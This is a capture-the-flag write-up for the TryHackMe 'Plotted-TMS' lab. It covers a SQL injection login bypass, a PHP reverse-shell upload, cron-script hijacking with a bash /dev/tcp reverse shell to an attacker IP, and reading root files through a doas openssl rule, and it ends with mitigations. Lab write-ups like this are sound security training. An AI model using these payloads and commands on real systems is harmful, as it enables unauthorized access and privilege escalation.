[Plotted-TMS](https://tryhackme.com/room/plottedtms)

**Difficulty:** Easy

**Objective:** Exploit a vulnerable login with SQL injection, gain shell access via file upload, escalate privileges through a writable cronjob, and read root flag using OpenSSL and doas.

---

## Table of Contents  
- [1. Summary](#1-summary)  
- [2. Methodology](#2-methodology)  
- [3. Reconnaissance](#3-reconnaissance)  
- [4. Enumeration](#4-enumeration)  
- [5. Exploitation](#5-exploitation)  
- [6. Privilege Escalation](#6-privilege-escalation)  
- [7. Post Exploitation](#7-post-exploitation)  
- [8. Flags / Proof](#8-flags--proof)  
- [9. Mitigations](#9-mitigations)  
- [10. Notes](#10-notes)

---

## 1. Summary  
**IP/URL:** 10.10.212.224  
**Service/Ports:** 22/SSH, 80/HTTP, 445/HTTP  
**Entry Point:** SQL injection on port 445 `/management` login  
**Privilege Escalation:** Writable cronjob and `doas` misconfiguration  
**Outcome:** Gained shell access as `plot_admin`, read root flag using OpenSSL

---

## 2. Methodology  
Following the PTES (Penetration Testing Execution Standard):  
1. Reconnaissance  
2. Enumeration  
3. Exploitation  
4. Privilege Escalation  
5. Post-Exploitation  
6. Reporting

---

## 3. Reconnaissance  
Nmap scan:  
nmap -sS -sV 10.10.212.224  
Results:  
- 22/tcp - OpenSSH 8.2p1  
- 80/tcp - Apache 2.4.41  
- 445/tcp - Apache 2.4.41

---

## 4. Enumeration  
Gobuster on port 80:  
Found: /admin, /shadow, /passwd — none useful  

Gobuster on port 445:  
Found: /management  
Navigated to http://10.10.212.224:445/management and found a login page  
Used SQL injection: `' OR '1'='1' --`  
Successfully bypassed login

---

## 5. Exploitation  
Page allowed file uploads  
Uploaded a PHP reverse shell from PentestMonkey  
Started listener: nc -lvnp 4000  
Triggered the shell, gained access as www-data  
Spawned TTY shell:  
python3 -c 'import pty; pty.spawn("/bin/bash")'

---

## 6. Privilege Escalation  
Ran LinPEAS, found a cronjob running:  
* * * * * plot_admin /var/www/scripts/backup.sh  
Could not edit the file, but owned the `/var/www/scripts` directory  
Removed and replaced the script:  
rm /var/www/scripts/backup.sh  
echo '#!/bin/bash' > /var/www/scripts/backup.sh  
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.21.***.***/4444 0>&1"' >> /var/www/scripts/backup.sh  
chmod +x /var/www/scripts/backup.sh  
Started listener: nc -lvnp 4444  
Got reverse shell as plot_admin  
Found user flag with `ls` and `less`

---

## 7. Post Exploitation  
Ran LinPEAS again and discovered a `doas` misconfiguration:  
permit nopass plot_admin as root cmd openssl  
Used GTFOBins for OpenSSL:  
LFILE=/root/root.txt  
doas -u root openssl enc -in "$LFILE"  
Successfully read the root flag

---

## 8. Flags / Proof  
User Flag: Retrieved as plot_admin from user directory  

Root Flag: Retrieved from /root/root.txt using OpenSSL and doas

---

## 9. Mitigations  
| Vulnerability                     | Risk   | Suggested Mitigation                              |  
|----------------------------------|--------|---------------------------------------------------|  
| SQL Injection                    | High   | Use prepared statements / parameterized queries   |  
| Arbitrary file upload            | High   | Restrict file types and enforce validation        |  
| Writable cronjob directory       | High   | Limit directory permissions and audit cron setup  |  
| doas misconfiguration            | High   | Limit doas privileges and review config (doas.conf) |

---

## 10. Notes  
Time spent: ~5 hours  

Tools used: nmap, gobuster, Burp Suite, pentestmonkey reverse shell, linpeas, nc  

Lessons learned: Always test all HTTP ports, SQL injection is still relevant, cronjob ownership can lead to root, and misconfigured doas with OpenSSL can be exploited to read protected files.
